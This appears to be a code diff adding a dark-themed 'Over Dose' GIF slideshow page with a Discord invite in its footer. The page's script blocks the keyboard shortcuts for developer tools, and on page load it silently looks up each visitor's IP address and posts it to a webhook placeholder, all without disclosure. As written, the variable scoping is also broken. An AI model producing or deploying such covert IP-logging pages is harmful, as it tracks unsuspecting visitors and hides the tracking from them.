@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Over Dose</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background-color: #000000; /* Black background */
+            color: #ff0000; /* Red text color */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .header {
+            font-family: 'Creepster', cursive; /* Custom font */
+            font-size: 2.5em;
+            margin: 20px 0;
+            color: #ff0000; /* Red color for header */
+        }
+        .slideshow-container {
+            max-width: 800px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .mySlides {
+            display: none;
+        }
+        .slideshow-container img {
+            width: 100%;
+            border: 2px solid #ccc; /* Light border around GIFs */
+            border-radius: 8px; /* Rounded corners */
+        }
+        .footer {
+            font-size: 1.2em;
+            color: #666; /* Gray color for footer text */
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            overflow: hidden;
+        }
+        .footer span {
+            display: inline-block;
+            animation: bounce 4s infinite linear;
+        }
+        @keyframes bounce {
+            0% { transform: translateX(100%); }
+            50% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="header">
+    Over Dose
+</div>
+
+<div class="slideshow-container">
+    <div class="mySlides fade">
+        <img src="1.gif" alt="GIF 1">
+    </div>
+    <div class="mySlides fade">
+        <img src="2.gif" alt="GIF 2">
+    </div>
+    <div class="mySlides fade">
+        <img src="3.gif" alt="GIF 3">
+    </div>
+    <div class="mySlides fade">
+        <img src="4.gif" alt="GIF 4">
+    </div>
+    <div class="mySlides fade">
+        <img src="5.gif" alt="GIF 5">
+    </div>
+    <div class="mySlides fade">
+        <img src="6.gif" alt="GIF 6">
+    </div>
+    <div class="mySlides fade">
+        <img src="7.gif" alt="GIF 7">
+    </div>
+</div>
+
+<div class="footer">
+    <span>Discord.gg/499</span>
+</div>
+
+<script>
+    // Prevent F12 Developer Tools from opening
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+    }
+
+    // Function to fetch visitor's IP address and send it via webhook
+    function fetchIPAndSend() {
+        const webhookURL = 'هني الويب هوك'; // Replace with your actual webhook URL
+
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                sendToWebhook(ip);
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    }
+
+    function sendToWebhook(ip) {
+        const message = {
+            content: `Visitor IP: ${ip}`
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('IP sent to webhook successfully');
+            } else {
+                console.error('Error sending IP to webhook:', response.statusText);
+            }
+        })
+        .catch(error => console.error('Error sending IP to webhook:', error));
+    }
+
+    // Execute the function to fetch IP and send on window load
+    window.onload = function() {
+        fetchIPAndSend();
+    };
+
+    // Slideshow functionality
+    let slideIndex = 0;
+    showSlides();
+
+    function showSlides() {
+        let slides = document.getElementsByClassName("mySlides");
+        for (let i = 0; i < slides.length; i++) {
+            slides[i].style.display = "none";  
+        }
+        slideIndex++;
+        if (slideIndex > slides.length) { slideIndex = 1 }    
+        slides[slideIndex - 1].style.display = "block";  
+        setTimeout(showSlides, 2000); // Change image every 2 seconds
+    }
+</script>
+
+</body>
+</html>
